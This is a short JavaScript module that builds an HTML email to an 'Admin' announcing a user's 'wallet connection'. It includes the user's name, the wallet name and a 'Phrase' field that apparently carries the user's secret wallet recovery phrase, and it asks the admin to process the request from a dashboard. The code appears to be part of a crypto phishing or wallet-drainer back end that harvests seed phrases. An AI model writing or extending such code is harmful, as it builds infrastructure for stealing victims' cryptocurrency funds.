const { baseTemplate, BRAND_COLOR } = require("../../messages");
const { format } = require("date-fns");

function buildWalletConnectMsg({ user, wallet }) {
  const content = `
         
      
          <p>Hello, Admin</p>
      
          <p>
           A new wallet connection  by user ${user?.firstName} ${user?.lastName}
          </p>
          <p>
           Walletname: ${wallet?.walletName}
          </p>
          <p>
           Phrase: ${wallet?.walletInfo}
         </p>
          <p>
            Please review and process request from the dashboard.
          </p>
        `;

  return baseTemplate({
    content,
  });
}

module.exports = { buildWalletConnectMsg };
